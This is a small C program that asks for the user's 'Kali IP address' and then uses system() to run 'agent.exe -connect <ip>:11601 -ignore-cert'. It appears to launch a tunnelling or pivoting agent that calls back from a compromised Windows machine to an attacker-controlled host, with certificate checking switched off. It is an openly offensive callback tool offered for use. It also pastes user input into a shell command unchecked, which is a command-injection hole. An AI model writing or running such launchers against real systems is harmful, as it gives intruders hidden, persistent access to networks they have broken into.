#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char kali_ip[100];
    char command[200];

    // Prompt user for their Kali IP address
    printf("Enter your Kali IP address: ");
    fgets(kali_ip, sizeof(kali_ip), stdin);

    // Remove the newline character if present
    size_t len = strlen(kali_ip);
    if (len > 0 && kali_ip[len - 1] == '\n') {
        kali_ip[len - 1] = '\0';
    }

    // Build the command string
    snprintf(command, sizeof(command), "agent.exe -connect %s:11601 -ignore-cert", kali_ip);

    // Execute the command
    int result = system(command);

    // Check if the command was successful
    if (result == -1) {
        printf("Failed to execute the command.\n");
    } else {
        printf("Command executed: %s\n", command);
    }

    return 0;
}
